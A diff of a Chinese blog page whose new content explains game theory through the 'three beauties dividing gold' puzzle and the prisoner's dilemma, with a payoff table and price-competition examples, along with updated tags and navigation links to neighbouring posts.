+<p>那么在实验的过程中，如何保证在杀掉美姬X之后，美姬A信守承诺均分金币呢？<br>A,B,C之间需要制定一个契约，规定B,C帮助A杀掉X之后，A能信守承诺均分金币。此外，为了防止A撕毁契约，还需要执行和守护契约的团体，通过分权的方式使其不能串通。执行和守护契约的团体的建立权在B,C手中，即实现了”民主”。</p>
+<hr>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>三姬分金这个故事很好的解释了社会中的一些现象：古代统治者为何需要拉拢底层人民、为何大副都想当船长…</p>
+<blockquote>
+<p>《1984》里面写到：有史以来，大概自从新石器时代结束以来，世上就有三种人，即上等人、中等人、下等人。 这三种人的目标是完全不可调和的。上等人的目标是要保持他们的地位。中等人的目标是要同高等人交换地位。下等人的特点始终是，他们劳苦之余无暇旁顾，偶而才顾到日常生活以外的事，因此他们如果有目标的话，无非是取消一切差别，建立一个人人平等的社会。</p>
+</blockquote>
+<hr>
+<h2 id="囚徒困境问题"><a href="#囚徒困境问题" class="headerlink" title="囚徒困境问题"></a>囚徒困境问题</h2><h3 id="问题简介"><a href="#问题简介" class="headerlink" title="问题简介"></a>问题简介</h3><p><a href="https://wiki.mbalib.com/wiki/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83" target="_blank" rel="noopener">囚徒困境</a>是博弈论的<a href="https://wiki.mbalib.com/wiki/%E9%9D%9E%E9%9B%B6%E5%92%8C%E5%8D%9A%E5%BC%88" target="_blank" rel="noopener">非零和博弈</a>中具代表性的例子，反映个人最佳选择并非团体最佳选择。虽然困境本身只属模型性质，但现实中的价格竞争、环境保护等方面，也会频繁出现类似情况。</p>
+<hr>
+<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>1950年，由就职于兰德公司的梅里尔·弗拉德（Merrill Flood）和梅尔文·德雷希尔（Melvin Dresher）拟定出相关困境的理论，后来由顾问阿尔伯特·塔克（Albert Tucker）以囚徒方式阐述，并命名为“囚徒困境”。经典的囚徒困境如下：</p>
+<blockquote>
+<p>警方逮捕甲、乙两名嫌疑犯，但没有足够证据指控二人入罪。于是警方分开囚禁嫌疑犯，分别和二人见面，并向双方提供以下相同的选择：</p>
+</blockquote>
+<blockquote>
+<p>若一人认罪并作证检举对方（相关术语称“背叛”对方），而对方保持沉默，此人将即时获释，沉默者将判监10年。<br><img src="https://img-blog.csdnimg.cn/20200411203310243.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="一方背叛"></p>
+</blockquote>
+<blockquote>
+<p>若二人都保持沉默（相关术语称互相“合作”），则二人同样判监一年。<br><img src="https://img-blog.csdnimg.cn/20200411203250576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzA5MjIzMg==,size_16,color_FFFFFF,t_70#pic_center" alt="双方背叛/双方合作"></p>
+</blockquote>
+<blockquote>
+<p>若二人都互相检举（互相“背叛”），则二人同样判监8年。</p>
+</blockquote>
+<p><strong>表格描述</strong></p>
+<table>
+<thead>
+<tr>
+<th>囚徒行为</th>
+<th>甲沉默（合作）</th>
+<th>甲认罪（背叛）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>乙沉默（合作）</td>
+<td>二人同服刑1年</td>
+<td>甲当即释放，乙服刑10年</td>
+</tr>
+<tr>
+<td>乙认罪（背叛）</td>
+<td>乙当即释放，甲服刑10年</td>
+<td>二人同服刑8年</td>
+</tr>
+</tbody></table>
+<p>如同博弈论的其他例证，囚徒困境假定每个参与者（即“囚徒”）都是利己的，即都寻求最大自身利益，而不关心另一参与者的利益。参与者某一策略所得利益，如果在任何情况下都比其他策略要低的话，此策略称为“严格劣势策略”，理性的参与者绝不会选择。另外，没有任何其他力量干预个人决策，参与者可完全按照自己意愿选择策略。</p>
+<hr>
+<h3 id="思维实验0-1"><a href="#思维实验0-1" class="headerlink" title="思维实验0"></a>思维实验0</h3><p>（1）从个体来看，囚徒的选择如下：</p>
+<ul>
+<li>如果对方选择沉默，背叛可以使我获释</li>
+<li>如果对方选择背叛，背叛可以使我的刑期减少</li>
+</ul>
+<p><strong>即从个体角度出发，背叛无疑是最优选择。</strong> 这场博弈中唯一可能达到的纳什均衡，就是双方参与者都背叛对方，结果二人同样服刑8年。</p>
+<p>（2）从团体角度来看，如果两个参与者都合作保持沉默，两人都只会被判刑一年，总体利益更高，结果也比两人背叛对方、判刑8年的情况较佳。但根据以上假设，二人均为理性的个人，且只追求自己个人利益。均衡状况会是两个囚徒都选择背叛，结果二人判决均比合作为高，总体利益较合作为低。这就是“困境”所在。例子漂亮地证明了：非零和博弈中，<a href="https://wiki.mbalib.com/wiki/%E5%B8%95%E7%B4%AF%E6%89%98%E6%9C%80%E4%BC%98" target="_blank" rel="noopener">帕累托最优</a>和<a href="https://wiki.mbalib.com/wiki/%E7%BA%B3%E4%BB%80%E5%9D%87%E8%A1%A1" target="_blank" rel="noopener">纳什均衡</a>是相冲突的。</p>
+<hr>
+<h3 id="思维实验1-1"><a href="#思维实验1-1" class="headerlink" title="思维实验1"></a>思维实验1</h3><p><strong>当囚徒困境多次重复发生</strong></p>
+<blockquote>
+<p>单次发生的囚徒困境，和多次重复的囚徒困境结果不会一样。在重复的囚徒困境中，博弈被反复地进行。因而每个参与者都有机会去“惩罚”另一个参与者前一回合的不合作行为。这时，合作可能会作为均衡的结果出现。欺骗的动机这时可能被受到惩罚的威胁所克服，从而可能导向一个较好的、合作的结果。作为反复接近无限的数量，纳什均衡趋向于帕累托最优。</p>
+</blockquote>
+<hr>
+<h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p><strong>囚徒困境主旨</strong></p>
+<blockquote>
+<p>囚徒困境的主旨为，囚徒们虽然彼此合作，坚决不坦白，可为全体带来最佳利益（累计和最少刑期），但在资讯不明的情况下，因为出卖同伙可为自己带来利益（缩短刑期）。同伙坦白可为他带来利益，因此彼此出卖虽违反最佳共同利益，反而是自己最大利益所在。但实际上，执法机构不可能设立如此情境来诱使所有囚徒招供，因为囚徒们必须考虑刑期以外之因素（出卖同伙会受到报复等），而无法完全以执法者所设立之利益（刑期）作考量。</p>
+</blockquote>
+<p><strong>囚徒困境的应用</strong></p>
+<blockquote>
+<p>许多行业的价格竞争都是典型的囚徒困境现象，每家企业都以对方为敌手，只关心自己的利益。在价格博弈中，只要以对方为敌手，那么不管对方的决策怎样，自己总是以为采取低价策略会占便宜，这就促使双方都采取低价策略。如可口可乐公司和百事可乐公司之间的竞争、各大航空公司之间的价格竞争等等。</p>
+</blockquote>
+<blockquote>
+<p>在国内的家电大战中，虽然不是两个对手之间的博弈，但由于在众多对手当中每一方的市场份额都很大，每一个主体人的行为后果受对手行为的影响都很大，因此，其情景大概也是如此。如果清楚这种前景，双方勾结或合作起来，都制定比较高的价格，那么双方都可以因为避免价格大战而获得较高的利润。但是往往这些联盟处于利益驱动的“囚徒困境”，双赢也就成泡影。五花八门的价格联盟总是非常短命，道理就在这里。</p>
+</blockquote>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -639,7 +618,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://github.com/littlematch59/littlematch59.github.io/2020/03/21/rop/">https://github.com/littlematch59/littlematch59.github.io/2020/03/21/rop/</a>
+                    <a href="https://github.com/littlematch59/littlematch59.github.io/2020/04/11/game/">https://github.com/littlematch59/littlematch59.github.io/2020/04/11/game/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -677,8 +656,12 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/rop/">
-                                    <span class="chip bg-color">rop</span>
+                                <a href="/tags/%E4%B8%89%E5%A7%AC%E5%88%86%E9%87%91/">
+                                    <span class="chip bg-color">三姬分金</span>
+                                </a>
+                            
+                                <a href="/tags/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83/">
+                                    <span class="chip bg-color">囚徒困境</span>
                                 </a>
                             
                         </div>
@@ -849,7 +832,7 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
         repo: 'littlematch59.github.io',
         owner: 'littlematch59',
         admin: "littlematch59",
-        id: '2020-03-21T10-40-54',
+        id: '2020-04-11T21-08-20',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -870,48 +853,55 @@ r<span class="token punctuation">.</span>interactive<span class="token punctuati
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2020/03/21/shellcode/">
+                <a href="/2020/04/11/game/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="堆指针越界&堆上布置shellcode|攻防世界pwn进阶区 note-service2">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="博弈论 | 三姬分金与囚徒困境">
                         
-                        <span class="card-title">堆指针越界&堆上布置shellcode|攻防世界pwn进阶区 note-service2</span>
+                        <span class="card-title">博弈论 | 三姬分金与囚徒困境</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言目前CTF竞赛中，以堆为背景的pwn题已逐步成为了pwn类型题目中的主流，开始逐步接触堆题，本题涉及到在堆上布置shellcode，并利用堆指针使程序执行流得到控制。
-思路分析0x00.检查保护机制
-Canary found：不能用溢出
+                            前言昨天在刷李永乐老师视频的时候看到了一个“三姬分金”的问题，然后引到了博弈论。说实话，从这个老师的课程中深深的感受到了知识的魅力。就想着写一个专栏，学习一下博弈论的有关知识。
+什么是博弈
+
+通俗地讲， 博弈就是指游戏中的一种选择策略的研究
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-03-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-11
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/pwn/" class="post-category">
-                                    pwn
+                            <a href="/categories/%E5%8D%9A%E5%BC%88%E8%AE%BA/" class="post-category">
+                                    博弈论
                                 </a>
                             
                             
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/heap/">
-                        <span class="chip bg-color">heap</span>
+                    <a href="/tags/%E4%B8%89%E5%A7%AC%E5%88%86%E9%87%91/">
+                        <span class="chip bg-color">三姬分金</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%9B%9A%E5%BE%92%E5%9B%B0%E5%A2%83/">
+                        <span class="chip bg-color">囚徒困境</span>
                     </a>
                     
                 </div>
@@ -925,31 +915,32 @@ Canary found：不能用溢出
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/03/21/google/">
+                <a href="/2020/04/03/revoke/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Google账号活动异常怎么办？|试了好多办法终于解决">
+                        <img src="/medias/featureimages/14.jpg" class="responsive-img" alt="授人以鱼不如授人以渔 | QQ、微信防撤回详解">
                         
-                        <span class="card-title">Google账号活动异常怎么办？|试了好多办法终于解决</span>
+                        <span class="card-title">授人以鱼不如授人以渔 | QQ、微信防撤回详解</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            前言我在copySDN上的帖子竟然被删了…给的理由是翻墙，wok…突然发现可以直接导出md再传到自己的blog上哈哈哈！说到google账户，我想不少人用google的时候都是以访客身份登录的。但是，一个google账户有些时候还是很有用的
+                            
+前言：哦吼？暗恋的女生/男生发消息又撤回了？表白没看到怎么办？！今天整理一下PC端QQ、微信防撤回的具体步骤，自己修改dll文件，再也不用担心网络上的dll被植入后门啦！P.S. 本教程理论上适合目前更新的所有版本QQ/Wechat，但手
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-03-21
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-03
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Google/" class="post-category">
-                                    Google
+                            <a href="/categories/crack/" class="post-category">
+                                    crack
                                 </a>
                             
                             
@@ -959,8 +950,12 @@ Canary found：不能用溢出
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87-Google%E8%B4%A6%E5%8F%B7/">
-                        <span class="chip bg-color">-疑难杂症 -Google账号</span>
+                    <a href="/tags/QQ/">
+                        <span class="chip bg-color">QQ</span>
+                    </a>
+                    
+                    <a href="/tags/Wechat/">
+                        <span class="chip bg-color">Wechat</span>
                     </a>
                     
                 </div>
